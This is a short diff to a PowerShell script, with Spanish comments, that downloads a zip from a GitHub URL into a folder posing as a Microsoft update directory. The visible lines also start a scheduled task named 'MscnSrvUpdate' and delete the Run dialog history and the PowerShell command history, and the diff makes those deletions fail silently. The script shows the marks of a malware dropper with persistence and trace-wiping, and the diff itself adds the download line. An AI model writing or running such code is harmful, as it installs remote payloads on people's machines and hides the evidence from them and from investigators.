@@ -1,3 +1,4 @@
+$url = "https://github.com/emakedie/UCN/raw/refs/heads/main/Mscn.zip"
 $destinationFolder = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate"
 $zipFile = Join-Path -Path $destinationFolder -ChildPath "Mscn.zip"
 
@@ -26,9 +27,9 @@ Start-ScheduledTask -TaskName "MscnSrvUpdate"
 
 # Limpiar historial de ejecucion
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
-Remove-Item -LiteralPath $registryPath -Force
+Remove-Item -LiteralPath $registryPath -Force -ErrorAction SilentlyContinue
 
 # Limpiar historial Powershell
 Clear-History
-Remove-Item $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Remove-Item $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction SilentlyContinue
 exit
